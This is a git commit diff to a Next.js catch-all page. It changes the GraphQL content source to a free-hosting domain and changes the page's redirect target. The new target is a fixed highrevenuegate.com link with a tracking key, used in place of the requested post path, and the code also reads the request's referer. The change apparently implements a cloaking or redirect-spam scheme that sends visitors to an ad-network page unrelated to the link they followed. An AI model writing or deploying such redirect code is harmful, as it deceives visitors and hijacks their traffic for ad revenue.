52c7a8e5ff4a56a00e62873487e2cadb820debb4
zoblah <134206234+zoblah@users.noreply.github.com>
2023-05-21 18:24:56 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://alcashzone.com/graphql"
+	const endpoint = "https://zoblah.000webhostapp.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://alcashzone.com/` + encodeURI(path as string)
+					`https://www.highrevenuegate.com/g3tvhxhf?key=5bdafc44174de8917a98d092a525919b`
 				}`,
 			},
 		};
